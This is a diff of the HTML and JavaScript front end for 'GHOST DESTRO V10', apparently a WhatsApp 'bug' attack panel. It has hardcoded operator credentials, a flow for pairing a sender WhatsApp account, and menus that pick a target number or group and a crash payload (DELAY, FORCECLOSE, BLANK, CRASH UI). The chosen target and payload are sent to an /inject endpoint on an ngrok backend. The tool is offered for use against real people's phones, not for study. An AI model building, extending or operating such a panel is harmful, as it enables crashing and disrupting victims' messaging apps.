@@ -2,283 +2,287 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GHOST DESTRO | REAL BUG ENGINE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>GHOST DESTRO V10 | DIMAS DEV</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Share+Tech+Mono&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
         :root {
             --neon-red: #ff0000;
-            --dark-red: #1a0000;
-            --bg-black: #000000; 
-            --glow: 0 0 20px rgba(255, 0, 0, 0.7);
+            --bg-black: #000000;
+            --glow: 0 0 15px rgba(255, 0, 0, 0.8);
             --font-cyber: 'Orbitron', sans-serif;
             --font-mono: 'Share Tech Mono', monospace;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg-black); color: #fff; font-family: 'Rajdhani', sans-serif; height: 100vh; overflow: hidden; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        html, body { width: 100%; height: 100%; background: #000; overflow: hidden; position: fixed; color: #fff; font-family: 'Rajdhani', sans-serif; }
 
-        #master-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -100; object-fit: cover; opacity: 0.1; }
-        .master-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: -99; }
+        #master-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; object-fit: cover; opacity: 0.15; }
 
-        .screen { display: none; height: 100vh; width: 100%; padding: 25px; overflow-y: auto; position: relative; z-index: 10; }
-        .active { display: block; animation: powerOn 0.4s ease-out; }
-        @keyframes powerOn { from { opacity: 0; filter: blur(10px); } to { opacity: 1; filter: blur(0); } }
-
-        /* HEADER NAMA GHOST DESTRO 16:9 AREA */
-        .ghost-header {
-            width: 100%; text-align: center; padding: 10px;
-            background: linear-gradient(to bottom, rgba(255,0,0,0.2), transparent);
-            border-bottom: 1px solid var(--neon-red); margin-bottom: 10px;
+        .screen {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-black); display: none; padding: 20px;
+            padding-bottom: 100px; overflow-y: auto; -webkit-overflow-scrolling: touch;
         }
-        .ghost-name { font-family: var(--font-cyber); font-size: 1.5rem; color: #fff; text-shadow: var(--glow); letter-spacing: 3px; }
+
+        #scr-login { display: flex !important; z-index: 10000; flex-direction: column; justify-content: center; align-items: center; }
+        .active-screen { display: block !important; z-index: 500; }
+        .popup-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9000; padding: 20px; overflow-y: auto; }
+        .active-popup { display: block !important; }
 
         .video-box {
-            width: 100%; aspect-ratio: 16 / 9; border: 2px solid var(--neon-red);
-            border-radius: 15px; overflow: hidden; box-shadow: var(--glow);
-            margin-bottom: 25px; background: #000; position: relative;
+            width: 100%; aspect-ratio: 16 / 9; border: 1px solid var(--neon-red);
+            border-radius: 12px; overflow: hidden; box-shadow: var(--glow);
+            margin-bottom: 20px; background: #000; flex-shrink: 0;
         }
         .video-box video { width: 100%; height: 100%; object-fit: cover; }
 
-        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .menu-card {
-            background: rgba(15, 0, 0, 0.95); border: 1px solid var(--neon-red);
-            border-radius: 12px; padding: 25px 10px; text-align: center;
-            transition: 0.2s; cursor: pointer;
-        }
-        .menu-card:active { transform: scale(0.95); background: var(--neon-red); }
-        .menu-card i { font-size: 2.2rem; color: var(--neon-red); margin-bottom: 10px; text-shadow: 0 0 10px red; }
-        .menu-card span { font-family: var(--font-cyber); font-size: 0.7rem; font-weight: 900; display: block; }
+        .ghost-header { width: 100%; text-align: center; padding: 15px; border-bottom: 2px solid var(--neon-red); margin-bottom: 20px; background: linear-gradient(180deg, #200, #000); }
+        .ghost-name { font-family: var(--font-cyber); font-size: 1.1rem; text-shadow: var(--glow); letter-spacing: 2px; }
 
         .cyber-input {
-            width: 100%; background: #000; border: 1px solid #400; padding: 18px;
-            color: #fff; border-radius: 12px; font-family: var(--font-mono); margin-bottom: 15px;
-            border-left: 5px solid var(--neon-red); outline: none;
+            width: 100%; background: #0a0a0a; border: 1px solid #333; padding: 16px;
+            color: #fff; border-radius: 10px; font-family: var(--font-mono); margin-bottom: 15px;
+            border-left: 5px solid var(--neon-red); font-size: 14px;
         }
 
-        .btn-supreme {
-            width: 100%; padding: 20px; background: var(--dark-red); border: 1px solid var(--neon-red);
-            color: #fff; font-family: var(--font-cyber); font-weight: 900; border-radius: 12px;
-            cursor: pointer; box-shadow: var(--glow); text-transform: uppercase; margin-bottom: 10px;
+        .btn-action {
+            width: 100%; padding: 18px; background: #1a0000; border: 1px solid var(--neon-red);
+            color: #fff; font-family: var(--font-cyber); font-size: 11px; font-weight: 900;
+            border-radius: 10px; cursor: pointer; text-transform: uppercase; box-shadow: var(--glow);
         }
 
-        .status-header { background: #050000; padding: 12px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #333; text-align: center; }
-        .badge { padding: 4px 12px; border-radius: 4px; font-size: 11px; font-weight: 900; }
-        .badge-off { background: #300; color: #f00; border: 1px solid red; }
-        .badge-on { background: #030; color: #0f0; border: 1px solid lime; box-shadow: 0 0 10px lime; }
+        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .menu-card {
+            background: #0a0a0a; border: 1px solid #222; border-radius: 15px;
+            padding: 15px 10px; text-align: center; border-bottom: 4px solid var(--neon-red);
+        }
+        .menu-card.v-selected { background: #400; border-color: #f00; box-shadow: var(--glow); }
+        .menu-card i { font-size: 1.5rem; color: var(--neon-red); margin-bottom: 8px; text-shadow: 0 0 10px red; }
+        .menu-card span { font-family: var(--font-cyber); font-size: 0.55rem; display: block; letter-spacing: 1px; }
 
-        .v-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
-        .v-item { background: #080000; border: 1px dashed #444; padding: 15px; border-radius: 10px; font-size: 11px; text-align: center; color: #666; font-family: var(--font-mono); cursor: pointer; }
-        .v-item.selected { border: 1px solid var(--neon-red); color: #fff; background: #300; box-shadow: 0 0 15px red; }
+        #list-grup-container {
+            width: 100%; max-height: 180px; overflow-y: auto; background: #050505;
+            border-radius: 10px; border: 1px solid #333; margin-bottom: 15px;
+        }
+        .group-item {
+            padding: 12px; border-bottom: 1px solid #111; display: flex;
+            justify-content: space-between; align-items: center;
+            font-family: var(--font-mono); font-size: 12px;
+        }
+        .group-item input[type="radio"] { accent-color: var(--neon-red); transform: scale(1.3); }
 
-        /* LIST GRUP STYLE - ANTI HITAM */
-        #list-grup-container { width: 100%; max-height: 300px; overflow-y: auto; background: #050000; border: 1px solid #333; border-radius: 10px; padding: 10px; }
-        .group-item { padding: 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
-        .group-name { font-family: var(--font-mono); font-size: 12px; color: #fff; }
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; width: 100%; height: 80px;
+            background: #000; border-top: 2px solid var(--neon-red);
+            display: none; justify-content: space-around; align-items: center; z-index: 8000;
+        }
+        .nav-item { text-align: center; color: #444; flex: 1; }
+        .nav-item.active-nav { color: var(--neon-red); text-shadow: 0 0 15px red; }
+        .nav-item i { font-size: 1.6rem; display: block; margin-bottom: 4px; }
+        .nav-item span { font-size: 9px; font-family: var(--font-cyber); font-weight: 900; }
 
-        .console { background: #000; border-top: 2px solid var(--neon-red); height: 100px; overflow-y: auto; padding: 12px; font-family: var(--font-mono); font-size: 10px; color: #0f0; margin-top: 15px; }
+        .console-box { background: #000; border: 1px solid #1a1a1a; padding: 10px; height: 80px; overflow-y: auto; font-family: var(--font-mono); font-size: 10px; color: #0f0; border-radius: 10px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
     <video id="master-bg" autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video>
-    <div class="master-overlay"></div>
 
-    <div id="scr-login" class="screen active">
-        <div style="height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
-            <div style="text-align: center; margin-bottom: 30px;">
-                <h1 style="font-family: var(--font-cyber); font-size: 3rem; color: var(--neon-red); text-shadow: var(--glow);">GHOST DESTRO</h1>
-                <p style="letter-spacing: 12px; font-size: 0.8rem; color: #444; font-weight: 900;">BUG ENGINE V10</p>
-            </div>
-            <div style="width: 100%; max-width: 320px;">
-                <input type="text" id="u-core" class="cyber-input" placeholder="OPERATOR ID">
-                <input type="password" id="p-core" class="cyber-input" placeholder="PASSKEY">
-                <button class="btn-supreme" onclick="authProcess()">AUTHORIZE</button>
-            </div>
+    <div id="scr-login" class="screen">
+        <div class="video-box" style="width: 85%;"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
+        <h1 style="font-family: var(--font-cyber); color: var(--neon-red); text-shadow: var(--glow);">GHOST DESTRO</h1>
+        <div style="width: 85%; margin-top: 20px;">
+            <input type="text" id="inp-user" class="cyber-input" placeholder="USERNAME...">
+            <input type="password" id="inp-pass" class="cyber-input" placeholder="PASSKEY...">
+            <button class="btn-action" onclick="forceLogin()">AUTHORIZE SYSTEM</button>
         </div>
     </div>
 
-    <div id="scr-main" class="screen">
-        <div class="ghost-header"><div class="ghost-name">GHOST DESTRO</div></div>
+    <div id="home" class="screen">
+        <div class="ghost-header"><div class="ghost-name">Ghost DESTRO HOME</div></div>
         <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
-        <div class="status-header">
-            <span id="st-badge" class="badge badge-off">SENDER: OFFLINE</span>
+        <div style="text-align: center; margin-bottom: 15px;">
+            <span id="st-badge" style="border: 1px solid red; padding: 4px 15px; border-radius: 20px; font-size: 9px; color: red;">SYSTEM: OFFLINE</span>
         </div>
         <div class="grid-menu">
-            <div class="menu-card" onclick="gate('scr-wa')"><i class="fa-solid fa-radiation"></i><span>BUG WA</span></div>
-            <div class="menu-card" onclick="gate('scr-gp')"><i class="fa-solid fa-biohazard"></i><span>BUG GRUP</span></div>
-            <div class="menu-card" onclick="nav('scr-sender')"><i class="fa-solid fa-link"></i><span>SENDER</span></div>
-            <div class="menu-card" onclick="window.location.href='https://wa.me/62895404399397'"><i class="fa-solid fa-ghost"></i><span>ADMIN</span></div>
-        </div>
-        <div class="console" id="log-main">> [READY] GHOST DESTRO Engine V10.0.1</div>
-    </div>
-
-    <div id="scr-sender" class="screen">
-        <div class="ghost-header"><div class="ghost-name">GHOST DESTRO</div></div>
-        <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
-        <div style="text-align: center; padding: 20px; border: 1px solid var(--neon-red); border-radius: 15px; background: rgba(0,0,0,0.95);">
-            <h2 style="font-family: var(--font-cyber); margin-bottom: 20px; font-size: 1.2rem;">WHATSAPP PAIRING</h2>
-            <div id="pair-1">
-                <input type="number" id="s-num" class="cyber-input" placeholder="628XXXXXXXXXX">
-                <button class="btn-supreme" onclick="generateCode()">CONNECT SENDER</button>
+            <div class="menu-card" onclick="openAtk('gp')"><i class="fa-solid fa-radiation"></i><span>BUG GRUP</span></div>
+            <div class="menu-card" onclick="openAtk('wa')"><i class="fa-solid fa-biohazard"></i><span>BUG WA</span></div>
+            <div class="menu-card" onclick="window.location.href='https://wa.me/62895404399397'"><i class="fa-brands fa-whatsapp"></i><span>ADMIN WA</span></div>
+            
+            <div class="menu-card" onclick="window.open('https://downloader-destro.vercel.app/', '_system')">
+                <i class="fa-solid fa-download"></i><span>DOWNLOADER</span>
             </div>
-            <div id="pair-2" style="display:none;">
-                <p style="font-size: 11px; color: #ff0000; margin-bottom: 15px;">MASUKKAN KODE INI DI WA:</p>
-                <div id="code-box" style="font-size: 3rem; color: #fff; font-family: var(--font-mono); border: 2px dashed red; padding: 15px; margin-bottom: 20px; letter-spacing: 5px;"></div>
-                <button class="btn-supreme" onclick="verifyConn()">VERIFY CONNECTION</button>
+            
+            <div class="menu-card" onclick="window.open('https://pembaca-wifi-bydestro.vercel.app/', '_system')">
+                <i class="fa-solid fa-wifi"></i><span>PEMBACA WIFI</span>
             </div>
         </div>
-        <button class="btn-supreme" style="background: #000; margin-top: 15px;" onclick="nav('scr-main')">KEMBALI</button>
+        <div class="console-box" id="log-home">> [SYSTEM] Active.</div>
     </div>
 
-    <div id="scr-wa" class="screen">
-        <div class="ghost-header"><div class="ghost-name">GHOST DESTRO</div></div>
+    <div id="sender" class="screen">
+        <div class="ghost-header"><div class="ghost-name">SENDER HUB</div></div>
         <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
-        <input type="number" id="t-wa" class="cyber-input" placeholder="NOMOR TARGET">
-        <div class="v-grid">
-            <div class="v-item" onclick="selV(this, 'DELAY')">LOC DELAY</div>
-            <div class="v-item" onclick="selV(this, 'CRASH')">NEWS CRASH</div>
-            <div class="v-item" onclick="selV(this, 'FORCECLOSE')">FORCE CLOSE</div>
-            <div class="v-item" onclick="selV(this, 'GHOST_ID')">GHOST BUG</div>
+        <div style="padding: 10px;">
+            <input type="number" id="num-1" class="cyber-input" placeholder="628xxxx">
+            <button class="btn-action" onclick="reqPair(1)">GENERATE CODE</button>
+            <div id="res-1" class="pairing-res"></div>
         </div>
-        <button class="btn-supreme" onclick="inject('wa')">EXECUTE ATTACK</button>
-        <button class="btn-supreme" style="background:#000;" onclick="nav('scr-main')">BACK</button>
     </div>
 
-    <div id="scr-gp" class="screen">
-        <div class="ghost-header"><div class="ghost-name">GHOST DESTRO</div></div>
+    <div id="profile" class="screen">
+        <div class="ghost-header"><div class="ghost-name">DEVELOPER PROFILE</div></div>
         <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
-        <h3 style="font-family: var(--font-cyber); font-size: 0.8rem; margin-bottom: 10px; color: var(--neon-red);">SELECT TARGET GROUP:</h3>
-        <div id="list-grup-container">
-            <p style="text-align: center; color: #444; font-family: var(--font-mono); padding: 20px;">Fetching Groups...</p>
+        <div style="text-align: center;">
+            <h2 style="color:red; font-family: var(--font-cyber);">DIMAS DEV</h2>
+            <p style="font-family: var(--font-mono); font-size: 12px; margin-top: 10px;">SUPREME RECOVERY V10</p>
         </div>
-        <div class="v-grid">
-            <div class="v-item" onclick="selV(this, 'DELAY')">GP DELAY</div>
-            <div class="v-item" onclick="selV(this, 'CRASH')">GP CRASH</div>
+    </div>
+
+    <div id="scr-gp" class="popup-screen">
+        <div class="ghost-header"><div class="ghost-name">GROUP INJECTION</div></div>
+        <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
+        <div id="list-grup-container"><p style="text-align: center; color: cyan; padding: 20px;">Fetching Lists...</p></div>
+        <div class="grid-menu">
+            <div class="menu-card v-btn-gp" onclick="selV('GP_DELAY', this, 'gp')"><i class="fa-solid fa-clock"></i><span>DELAY</span></div>
+            <div class="menu-card v-btn-gp" onclick="selV('GP_FORCLOSE', this, 'gp')"><i class="fa-solid fa-skull"></i><span>FORCLOSE</span></div>
+            <div class="menu-card v-btn-gp" onclick="selV('GP_BLANK', this, 'gp')"><i class="fa-solid fa-ghost"></i><span>BLANK</span></div>
+            <div class="menu-card v-btn-gp" onclick="selV('GP_CRASH', this, 'gp')"><i class="fa-solid fa-bomb"></i><span>CRASH UI</span></div>
         </div>
-        <button class="btn-supreme" style="background:#000; margin-top: 10px;" onclick="nav('scr-main')">BACK</button>
+        <button class="btn-action" style="background: red; margin-top: 15px;" onclick="ex('gp')">INJECT</button>
+        <button class="btn-action" style="margin-top: 10px; border-color: #444;" onclick="clsAtk()">CLOSE</button>
+    </div>
+
+    <div id="scr-wa" class="popup-screen">
+        <div class="ghost-header"><div class="ghost-name">WA INJECTION</div></div>
+        <div class="video-box"><video autoplay muted loop playsinline><source src="wa.mp4" type="video/mp4"></video></div>
+        <input type="number" id="target-wa" class="cyber-input" placeholder="TARGET (628...)">
+        <div class="grid-menu">
+            <div class="menu-card v-btn-wa" onclick="selV('DELAY', this, 'wa')"><i class="fa-solid fa-clock"></i><span>DELAY</span></div>
+            <div class="menu-card v-btn-wa" onclick="selV('FORCECLOSE', this, 'wa')"><i class="fa-solid fa-power-off"></i><span>FORCLOSE</span></div>
+            <div class="menu-card v-btn-wa" onclick="selV('BLANK', this, 'wa')"><i class="fa-solid fa-ghost"></i><span>BLANK</span></div>
+            <div class="menu-card v-btn-wa" onclick="selV('CRASH_UI', this, 'wa')"><i class="fa-solid fa-bomb"></i><span>CRASH UI</span></div>
+        </div>
+        <button class="btn-action" style="background: red; margin-top: 15px;" onclick="ex('wa')">LAUNCH</button>
+        <button class="btn-action" style="margin-top: 10px; border-color: #444;" onclick="clsAtk()">CLOSE</button>
+    </div>
+
+    <div class="bottom-nav" id="b-nav">
+        <div class="nav-item active-nav" onclick="go('home', this)"><i class="fa-solid fa-house"></i><span>HOME</span></div>
+        <div class="nav-item" onclick="go('sender', this)"><i class="fa-brands fa-whatsapp"></i><span>SENDER</span></div>
+        <div class="nav-item" onclick="go('profile', this)"><i class="fa-solid fa-user-shield"></i><span>PROFILE</span></div>
     </div>
 
     <script>
-        let isConnected = false;
-        let activeVirus = "";
-        let selectedGroupId = "";
-        const SERVER_URL = window.location.origin;
+        let isOnline = false;
+        let vSel = "";
+        let gSel = "";
+        
+        // GANTI YANG LAMA JADI INI:
+          const API = "https://tony-flightless-roman.ngrok-free.dev";
 
-        function authProcess() {
-            const u = document.getElementById('u-core').value;
-            const p = document.getElementById('p-core').value;
-            if(u === "DESTRO" && p === "SUPREME") {
-                nav('scr-main');
-                writeLog('log-main', "[OK] Operator Authorized.");
-                checkStatus(); // Cek status otomatis pas masuk
-            } else { alert("ID/PASS SALAH!"); }
+        function forceLogin() {
+            const u = document.getElementById('inp-user').value.trim();
+            const p = document.getElementById('inp-pass').value.trim();
+            if(u === "DESTROVVIP" && p === "SUPREME-DESTRO") {
+                document.getElementById('scr-login').style.setProperty('display', 'none', 'important');
+                document.getElementById('home').classList.add('active-screen');
+                document.getElementById('b-nav').style.display = "flex";
+                startSystem();
+            } else { alert("ACCESS DENIED!"); }
         }
 
-        function gate(s) {
-            if(!isConnected) { alert("SENDER OFFLINE!"); nav('scr-sender'); }
-            else { 
-                nav(s); 
-                if(s === 'scr-gp') loadGroups(); // Panggil fungsi muat grup pas layar grup dibuka
-            }
+        function startSystem() {
+            updateSt();
+            setInterval(updateSt, 5000);
         }
 
-        async function checkStatus() {
+        async function updateSt() {
             try {
-                const r = await fetch(`${SERVER_URL}/status`);
+                const r = await fetch(`${API}/status`);
                 const d = await r.json();
-                if(d.connected) {
-                    isConnected = true;
-                    document.getElementById('st-badge').className = "badge badge-on";
-                    document.getElementById('st-badge').innerText = "SENDER: CONNECTED";
-                }
-            } catch (e) { console.log("Server unreach"); }
+                const b = document.getElementById('st-badge');
+                isOnline = d.connected;
+                b.innerText = isOnline ? "SYSTEM: ONLINE" : "SYSTEM: OFFLINE";
+                b.style.color = isOnline ? "#0f0" : "red";
+                b.style.borderColor = isOnline ? "#0f0" : "red";
+            } catch(e) { isOnline = false; }
         }
 
-        async function loadGroups() {
-            const container = document.getElementById('list-grup-container');
-            container.innerHTML = '<p style="text-align:center; color: #0f0;">Loading Groups...</p>';
+        function go(id, el) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
+            document.getElementById(id).classList.add('active-screen');
+            el.classList.add('active-nav');
+        }
+
+        function openAtk(type) {
+            document.getElementById(`scr-${type}`).classList.add('active-popup');
+            if(type === 'gp') fetchGP();
+        }
+
+        function clsAtk() {
+            document.querySelectorAll('.popup-screen').forEach(p => p.classList.remove('active-popup'));
+            vSel = "";
+            document.querySelectorAll('.menu-card').forEach(m => m.classList.remove('v-selected'));
+        }
+
+        function selV(v, el, type) {
+            vSel = v;
+            document.querySelectorAll(`.v-btn-${type}`).forEach(m => m.classList.remove('v-selected'));
+            el.classList.add('v-selected');
+        }
+
+        async function fetchGP() {
+            const cont = document.getElementById('list-grup-container');
+            cont.innerHTML = "<p style='text-align: center; color: cyan; padding: 10px;'>Syncing...</p>";
             try {
-                const r = await fetch(`${SERVER_URL}/getgroups`);
-                const groups = await r.json();
-                container.innerHTML = '';
-                if(groups.length === 0) container.innerHTML = '<p style="text-align:center; color:#f00;">No Groups Found!</p>';
-                groups.forEach(g => {
-                    const div = document.createElement('div');
-                    div.className = 'group-item';
-                    div.innerHTML = `
-                        <span class="group-name">${g.subject || g.id}</span>
-                        <button class="badge badge-on" style="cursor:pointer" onclick="executeGroupBug('${g.id}')">ATTACK</button>
-                    `;
-                    container.appendChild(div);
+                const r = await fetch(`${API}/getgroups`);
+                const data = await r.json();
+                cont.innerHTML = "";
+                data.forEach(g => {
+                    const d = document.createElement('div');
+                    d.className = "group-item";
+                    d.innerHTML = `<span>${g.subject || g.id}</span><input type="radio" name="gp" onclick="gSel='${g.id}'">`;
+                    cont.appendChild(d);
                 });
-            } catch (e) { container.innerHTML = '<p style="text-align:center; color:#f00;">Error Loading Groups!</p>'; }
+            } catch(e) { cont.innerHTML = "Sender Offline."; }
         }
 
-        async function generateCode() {
-            const num = document.getElementById('s-num').value;
-            if(num.length < 10) return alert("NOMOR SALAH!");
+        async function reqPair(slot) {
+            let num = document.getElementById(`num-${slot}`).value;
+            num = num.replace(/[^0-9]/g, '');
+            const res = document.getElementById(`res-${slot}`);
+            if(!num || num.length < 10) return alert("Nomor tidak valid!");
+            res.innerText = "WAIT...";
             try {
-                const r = await fetch(`${SERVER_URL}/get-pairing`, {
+                const r = await fetch(`${API}/get-pairing`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ number: num })
                 });
                 const d = await r.json();
-                if(d.code) {
-                    document.getElementById('pair-1').style.display = "none";
-                    document.getElementById('pair-2').style.display = "block";
-                    document.getElementById('code-box').innerText = d.code;
-                }
-            } catch (e) { alert("Termux Error!"); }
+                res.innerText = d.code || "FAIL";
+            } catch(e) { res.innerText = "ERR"; }
         }
 
-        async function verifyConn() {
-            await checkStatus();
-            if(isConnected) { nav('scr-main'); } else { alert("Belum Tertaut!"); }
-        }
-
-        function selV(el, v) {
-            document.querySelectorAll('.v-item').forEach(i => i.classList.remove('selected'));
-            el.classList.add('selected');
-            activeVirus = v;
-        }
-
-        async function executeGroupBug(gid) {
-            if(!activeVirus) return alert("PILIH VIRUS DULU!");
-            writeLog('log-main', `[SENDING] ${activeVirus} to Group ${gid}...`);
-            await exec(gid, activeVirus, null);
-        }
-
-        async function inject(type) {
-            const target = document.getElementById('t-wa').value;
-            if(!target || !activeVirus) return alert("DATA KOSONG!");
-            writeLog('log-main', `[SENDING] ${activeVirus} to ${target}...`);
-            await exec(target, activeVirus, null);
-        }
-
-        async function exec(t, vType, i) {
+        async function ex(type) {
+            if(!isOnline) return alert("SENDER OFFLINE!");
+            if(!vSel) return alert("Pilih payload!");
+            const target = type === 'wa' ? document.getElementById('target-wa').value : gSel;
+            if(!target) return alert("Target kosong!");
             try {
-                const r = await fetch(`${SERVER_URL}/inject`, {
+                const r = await fetch(`${API}/inject`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ target: t, type: vType, image: i })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target: target, type: vSel })
                 });
-                const res = await r.json();
-                if(res.status === "success") alert("ATTACK SUCCESS!");
-            } catch (e) { alert("Server Down!"); }
-        }
-
-        function nav(id) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-        }
-
-        function writeLog(id, msg) {
-            const b = document.getElementById(id);
-            if(b) { b.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`; b.scrollTop = b.scrollHeight; }
+                const d = await r.json();
+                if(d.status === "success") alert("SENT!");
+            } catch(e) { alert("Error!"); }
         }
     </script>
 </body>
